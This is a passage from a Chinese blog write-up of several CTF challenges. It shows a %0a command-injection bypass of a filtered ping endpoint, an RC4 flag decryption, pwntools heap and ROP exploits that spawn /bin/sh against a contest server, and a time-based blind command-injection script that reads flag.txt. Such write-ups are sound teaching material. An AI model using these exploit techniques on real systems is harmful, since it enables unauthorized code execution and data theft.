            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Wrong password.."</span>;
        &#125;
--&gt;</code></pre>

<p>数组绕过 + 文件包含</p>
<p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gabe5terocj31ec0laq5q.jpg" data-caption data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gabe5terocj31ec0laq5q.jpg" alt></a></p>
<p>读 ping.php </p>
<p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gabe735n6mj31j60pijyf.jpg" data-caption data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gabe735n6mj31j60pijyf.jpg" alt></a></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_REQUEST[ <span class="hljs-string">'ip'</span> ])) &#123;
    $target = trim($_REQUEST[ <span class="hljs-string">'ip'</span> ]);
    $substitutions = <span class="hljs-keyword">array</span>(
        <span class="hljs-string">'&amp;'</span>  =&gt; <span class="hljs-string">''</span>,
        <span class="hljs-string">';'</span>  =&gt; <span class="hljs-string">''</span>,
        <span class="hljs-string">'|'</span> =&gt; <span class="hljs-string">''</span>,
        <span class="hljs-string">'-'</span>  =&gt; <span class="hljs-string">''</span>,
        <span class="hljs-string">'$'</span>  =&gt; <span class="hljs-string">''</span>,
        <span class="hljs-string">'('</span>  =&gt; <span class="hljs-string">''</span>,
        <span class="hljs-string">')'</span>  =&gt; <span class="hljs-string">''</span>,
        <span class="hljs-string">'`'</span>  =&gt; <span class="hljs-string">''</span>,
        <span class="hljs-string">'||'</span> =&gt; <span class="hljs-string">''</span>,
    );
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    $cmd = shell_exec( <span class="hljs-string">'ping  -c 4 '</span> . $target );
        <span class="hljs-keyword">echo</span> $target;
    <span class="hljs-keyword">echo</span>  <span class="hljs-string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;
&#125;</code></pre>

<p>过滤了很多分隔符 可以用 %0a</p>
<p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gabe97vmx8j30tg0dkta4.jpg" data-caption data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gabe97vmx8j30tg0dkta4.jpg" alt></a></p>
<p>flag{You_AR3_qiao_bi_KuN???}</p>
<h2 id="apk123">apk123<a class="post-anchor" href="#apk123"></a></h2><p>可以发现 输入经过 <code>public static String encry_RC4_string(String paramString1, String paramString2) { return (paramString1 == null || paramString2 == null) ? null : toHexString(asString(encry_RC4_byte(paramString1, paramString2))); }</code> 然后和 <code>FlagEncode</code> 进行对比</p>
<pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">toHexString</span><span class="hljs-params">(String paramString)</span> </span>&#123;
  String str = <span class="hljs-string">""</span>;
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">byte</span> b = <span class="hljs-number">0</span>; b &lt; paramString.length(); b++) &#123;
    String str2 = Integer.toHexString(paramString.charAt(b) &amp; <span class="hljs-number">0xFF</span>);
    String str1 = str2;
    <span class="hljs-keyword">if</span> (str2.length() == <span class="hljs-number">1</span>)
      str1 = <span class="hljs-string">'0'</span> + str2; 
    str = str + str1;
  &#125; 
  <span class="hljs-keyword">return</span> str;
&#125;</code></pre>

<p>将字符转为了16进制，最后引用了 RC4base</p>
<pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] RC4Base(<span class="hljs-keyword">byte</span>[] paramArrayOfByte, String paramString) &#123;
  <span class="hljs-keyword">char</span> c = Character.MIN_VALUE;
  <span class="hljs-keyword">byte</span> b1 = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">byte</span>[] arrayOfByte1 = initKey(paramString);
  <span class="hljs-keyword">byte</span>[] arrayOfByte2 = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[paramArrayOfByte.length];
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">byte</span> b = <span class="hljs-number">0</span>; b &lt; paramArrayOfByte.length; b++) &#123;
    c = c + <span class="hljs-keyword">true</span> &amp; <span class="hljs-number">0xFF</span>;
    b1 = (arrayOfByte1[c] &amp; <span class="hljs-number">0xFF</span>) + b1 &amp; <span class="hljs-number">0xFF</span>;
    <span class="hljs-keyword">byte</span> b2 = arrayOfByte1[c];
    arrayOfByte1[c] = arrayOfByte1[b1];
    arrayOfByte1[b1] = b2;
    <span class="hljs-keyword">byte</span> b3 = arrayOfByte1[c];
    <span class="hljs-keyword">byte</span> b4 = arrayOfByte1[b1];
    arrayOfByte2[b] = (<span class="hljs-keyword">byte</span>)(paramArrayOfByte[b] ^ arrayOfByte1[(b3 &amp; <span class="hljs-number">0xFF</span>) + (b4 &amp; <span class="hljs-number">0xFF</span>) &amp; <span class="hljs-number">0xFF</span>]);
  &#125; 
  <span class="hljs-keyword">return</span> arrayOfByte2;
&#125;</code></pre>

<pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum <span class="hljs-keyword">as</span> ln
<span class="hljs-keyword">import</span> base64 <span class="hljs-keyword">as</span> bs64
<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4
<span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> b2a_hex, a2b_hex
enc = <span class="hljs-number">0x52aedea36a3c058b38aa32e625889947db302a6d1defdabf413085abf611487bf445e85108327a867c27</span>
enc = ln.n2s(enc)
<span class="hljs-keyword">print</span> enc
key = <span class="hljs-string">"Flag&#123;This_Not_Flag&#125;"</span>
ob2 = ARC4.new(key)
flag = ob2.decrypt(enc)

<span class="hljs-keyword">print</span> flag
<span class="hljs-comment">#flag&#123;11111111-1111-1234-1234-aaaabbbbcccc&#125;</span></code></pre>

<h2 id="Internal-Chat-System">Internal Chat System<a class="post-anchor" href="#Internal-Chat-System"></a></h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-comment"># io=remote('120.55.43.255',19812)</span>
io=process(<span class="hljs-string">"./Internal Chat System"</span>)
libc=ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)
context.log_level=<span class="hljs-string">'debug'</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span><span class="hljs-params">(name)</span>:</span>
    io.sendline(<span class="hljs-string">'1'</span>)
    io.recvuntil(<span class="hljs-string">'Please input your user name:'</span>)
    io.send(name)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span><span class="hljs-params">(size,name,age,description)</span>:</span>
    io.sendline(<span class="hljs-string">'2'</span>)
    io.recvuntil(<span class="hljs-string">'Input your name size:'</span>)
    io.send(str(size))
    io.recvuntil(<span class="hljs-string">'Input your name:'</span>)
    io.send(name)
    io.recvuntil(<span class="hljs-string">'Input your age:'</span>)
    io.send(str(age))
    io.recvuntil(<span class="hljs-string">'Input your description:'</span>)
    io.send(description)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">view_profile</span><span class="hljs-params">()</span>:</span>
    io.sendline(<span class="hljs-string">'1'</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span><span class="hljs-params">(name,age,description)</span>:</span>
    io.sendline(<span class="hljs-string">'2'</span>)
    io.recvuntil(<span class="hljs-string">'Input your name:'</span>)
    io.send(name)
    io.recvuntil(<span class="hljs-string">'Input your age:'</span>)
    io.send(str(age))
    io.recvuntil(<span class="hljs-string">'Input your description:'</span>)
    io.send(description)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_delete_friend</span><span class="hljs-params">(choice,name)</span>:</span>
    io.sendline(<span class="hljs-string">'3'</span>)
    io.recvuntil(<span class="hljs-string">"Input the friend's name:"</span>)
    io.send(name)
    io.recvuntil(<span class="hljs-string">'So..Do u want to add or delete this friend?(a/d)'</span>)
    io.send(choice)
    <span class="hljs-keyword">if</span> choice==<span class="hljs-string">'a'</span>:
        io.recvuntil(<span class="hljs-string">'Done!\n'</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">pass</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_message</span><span class="hljs-params">(user,title,content)</span>:</span>
    io.sendline(<span class="hljs-string">'4'</span>)
    io.recvuntil(<span class="hljs-string">'Which user do you want to send a msg to:'</span>)
    io.send(user)
    io.recvuntil(<span class="hljs-string">'Input your message title:'</span>)
    io.send(title)
    io.recvuntil(<span class="hljs-string">'Input your content:'</span>)
    io.send(content)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">view_message</span><span class="hljs-params">()</span>:</span>
    io.sendline(<span class="hljs-string">'5'</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span><span class="hljs-params">()</span>:</span>
    io.sendline(<span class="hljs-string">'6'</span>)

register(<span class="hljs-number">16</span>,<span class="hljs-string">'a\x00'</span>,<span class="hljs-number">18</span>,<span class="hljs-string">'nothing'</span>)
login(<span class="hljs-string">'a\x00'</span>)
add_delete_friend(<span class="hljs-string">'a\x00'</span>,<span class="hljs-string">'a\x00'</span>)
add_delete_friend(<span class="hljs-string">'d\x00'</span>,<span class="hljs-string">'a\x00'</span>)
view_profile()
io.recvuntil(<span class="hljs-string">'Age:'</span>)
libc_base=eval(<span class="hljs-string">'0x'</span>+io.recvuntil(<span class="hljs-string">'b78'</span>))-libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]<span class="hljs-number">-0x68</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">"libc_base -&gt; "</span> + hex(libc_base)
logout()
register(<span class="hljs-number">0x128</span>,p64(<span class="hljs-number">0x0000000000603068</span>)+p64(<span class="hljs-number">18</span>),<span class="hljs-number">18</span>,<span class="hljs-string">'nothing'</span>)
login(p64(libc_base+libc.symbols[<span class="hljs-string">'atoi'</span>])[:<span class="hljs-number">-2</span>])
update(p64(libc_base+libc.symbols[<span class="hljs-string">'system'</span>])[:<span class="hljs-number">-2</span>],<span class="hljs-number">18</span>,<span class="hljs-string">'\x00'</span>)
io.send(<span class="hljs-string">'/bin/sh\x00'</span>)
io.interactive()</code></pre>

<p>flag{plty0p6f-2zbb-eyn6-mdbc-d09mh74658au}</p>
<h1 id="day5">day5<a class="post-anchor" href="#day5"></a></h1><h2 id="reverse">reverse<a class="post-anchor" href="#reverse"></a></h2><p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gaci6wpx1tj314a0c240o.jpg" data-caption data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaci6wpx1tj314a0c240o.jpg" alt></a></p>
<pre><code class="hljs python">enc = [<span class="hljs-number">0x17</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x02</span>]
flag =<span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(enc), <span class="hljs-number">2</span>):
    a = enc[i]^<span class="hljs-number">16</span>
    b = enc[i+<span class="hljs-number">1</span>]^<span class="hljs-number">16</span>

    bh = b//<span class="hljs-number">16</span>
    bl = b%<span class="hljs-number">16</span>
    ah = a//<span class="hljs-number">16</span>
    al = a%<span class="hljs-number">16</span>

    c = bh + al*<span class="hljs-number">16</span>
    d = ah + bl*<span class="hljs-number">16</span>
    flag+=chr(c)+chr(d)
<span class="hljs-keyword">print</span> <span class="hljs-string">"flag:&#123;"</span>+flag+<span class="hljs-string">"&#125;"</span></code></pre>

<h2 id="web-2">web<a class="post-anchor" href="#web-2"></a></h2><p>exec没有回显</p>
<p>时间盲注</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> string
dic = string.printable
flag = <span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>):
	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(dic)):
		url = <span class="hljs-string">"http://120.55.43.255:22712"</span>
		data = &#123;
			<span class="hljs-string">"cmd"</span> : <span class="hljs-string">'''[ `cut -c '''</span>+str(j)+<span class="hljs-string">''' flag.txt` =  "%c" ]  &amp;&amp; sleep 5'''</span>%dic[i]
		&#125;
		<span class="hljs-keyword">try</span>:
			r = requests.post(url,data=data,timeout=<span class="hljs-number">1</span>)
			<span class="hljs-comment"># print data</span>
		<span class="hljs-keyword">except</span> requests.exceptions.ReadTimeout,e:
			flag += dic[i]
			<span class="hljs-keyword">print</span> flag
			<span class="hljs-keyword">break</span></code></pre>

<a href="https://tva1.sinaimg.cn/large/006tNbRwly1gacjzckwo5j30j413cn2z.jpg" data-caption data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gacjzckwo5j30j413cn2z.jpg" alt></a>

<p>第二种是通过dns反带但是这题打不通</p>
<h2 id="pwn-1">pwn<a class="post-anchor" href="#pwn-1"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span>
<span class="hljs-comment">#encoding:utf-8</span>
<span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> sys
context.arch = <span class="hljs-string">'amd64'</span>
<span class="hljs-comment"># context.log_level='debug'</span>
context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]
file_name = <span class="hljs-string">'./Self-service Refueling System'</span>
ip = <span class="hljs-string">'120.55.43.255'</span>
port = <span class="hljs-string">'23810'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
	p = process(file_name)
	elf = ELF(file_name)
	libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)
<span class="hljs-keyword">else</span>:
	p = remote(ip,int(port))
	elf = ELF(file_name)
	libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)
li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)
ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)

rdi_ret = <span class="hljs-number">0x0000000000400fb3</span>
main = <span class="hljs-number">0x0000000000400EAA</span>
<span class="hljs-comment">#740</span>
p.sendlineafter(<span class="hljs-string">"(y/n)\n"</span>,<span class="hljs-string">"y"</span>)
p.recvuntil(<span class="hljs-string">"Card ID :\n"</span>)
payload = <span class="hljs-string">"a"</span>*(<span class="hljs-number">0x18</span>)+p32(<span class="hljs-number">0x6666</span>)+p32(<span class="hljs-number">0x2333</span>)+p64(<span class="hljs-number">1</span>)
payload += p64(rdi_ret)+p64(elf.got[<span class="hljs-string">'__libc_start_main'</span>])+p64(elf.plt[<span class="hljs-string">'puts'</span>])+p64(main)
p.sendline(payload)
p.sendlineafter(<span class="hljs-string">"ou want?(L)\n"</span>,<span class="hljs-string">"1L"</span>)
p.recvuntil(<span class="hljs-string">"gas\n"</span>)
p.recvuntil(<span class="hljs-string">"\x30\x6d"</span>)
addr = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))
ls(<span class="hljs-string">"libc start main"</span>,addr)
libc.address = addr-libc.symbols[<span class="hljs-string">'__libc_start_main'</span>]
ls(<span class="hljs-string">"libc addr"</span>,libc.address)

p.sendlineafter(<span class="hljs-string">"(y/n)\n"</span>,<span class="hljs-string">"y"</span>)
p.recvuntil(<span class="hljs-string">"Card ID :\n"</span>)
payload = <span class="hljs-string">"a"</span>*(<span class="hljs-number">0x18</span>)+p32(<span class="hljs-number">0x6666</span>)+p32(<span class="hljs-number">0x2333</span>)+p64(<span class="hljs-number">1</span>)
payload +=  p64(rdi_ret)+p64(libc.search(<span class="hljs-string">"/bin/sh\x00"</span>).next())+p64(libc.symbols[<span class="hljs-string">'system'</span>])
p.sendline(payload)
p.sendlineafter(<span class="hljs-string">"ou want?(L)\n"</span>,<span class="hljs-string">"1L"</span>)

p.interactive()</code></pre>



  
    <div class="post-reward">
    <div id="reward-button">打赏</div>
      <div id="qr">
        <div class="wrap">
            
            <div class="bg-wrap">
              <a href="/images/zhifubao.png" target="_block" class="bg" style="background-image:url('/images/zhifubao.png')"></a>
              支付宝
            </div>
            
            
            <div class="bg-wrap">
                <a href="/images/weixin.png" target="_block" class="bg" style="background-image:url('/images/weixin.png')"></a>
              微信
            </div>
            
        </div>
      </div>
    </div>
  
  <div class="post-guide">
    <div class="item left">
        
    </div>
    <div class="item right">
        
          <a href="/2019/12/17/buuoj-pwn/">buuoj->pwn</a>
        
    </div>
  </div>

  

  <div class="post-copyright">
    <div class="auth">
      本文作者：<a href="http://pumpkin9.github.io">pumpkin9</a>
    </div>
    <div class="link">
      永久链接：<a href="http://pumpkin9.github.io/2019/12/24/第四季CTF答题赛write-up/">http://pumpkin9.github.io/2019/12/24/第四季CTF答题赛write-up/</a>
    </div>
    <div class="declare">
      版权声明：本文首发于<a href="http://pumpkin9.github.io">pumpkin9</a>的博客，转载请注明出处！
    </div>
  </div>

  <div id="comment"></div>

  
  
</article>
        <footer>
          <div class="copyright">
            ©2019
            <a href="http://pumpkin9.github.io">pumpkin9</a> Powered by <a href="https://hexo.io">Hexo</a> |
            <a href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
          </div>
          
        </footer>
      </div>
    </div>
  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":70,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false});</script></body>
  
</html>
<script type="text/javascript">
                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"valine\":{\"API_ID\":\"vVaPNFdcK9dSGbIzRRK8Lynz-gzGzoHsz\",\"API_KEY\":\"dPlqFhVLg4CTqpRKmq7I0cQw\"},\"service_worker\":{\"open\":false}}")
                </script> <script type="text/javascript">window.addEventListener('load', function() {
    
    window.loadJs = function(d, m, a) {
      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
      var b = document.createElement('script')
      b.defer = true
      b.setAttribute('type', 'text/javascript')
      b.setAttribute('charset', 'UTF-8')
      b.setAttribute('async', 'true')
      b.setAttribute('src', d)
      m && b.setAttribute('data-main', '/scripts/app-built')
      if (typeof a === 'function') {
        if (window.attachEvent) {
          b.onreadystatechange = function() {
            var e = b.readyState
            if (e === 'loaded' || e === 'complete') {
              b.onreadystatechange = null
              a()
            }
          }
        } else {
          b.onload = a
        }
      }
      c.appendChild(b)
    }
    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
  })</script> <script type="text/javascript">
                  ;(function() {
                    var bp = document.createElement('script')
                    var curProtocol = window.location.protocol.split(':')[0]
                    if (curProtocol === 'https') {
                      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
                    } else {
                      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
                    }
                    var s = document.getElementsByTagName('script')[0]
                    s.parentNode.insertBefore(bp, s)
                  })()
                </script> 
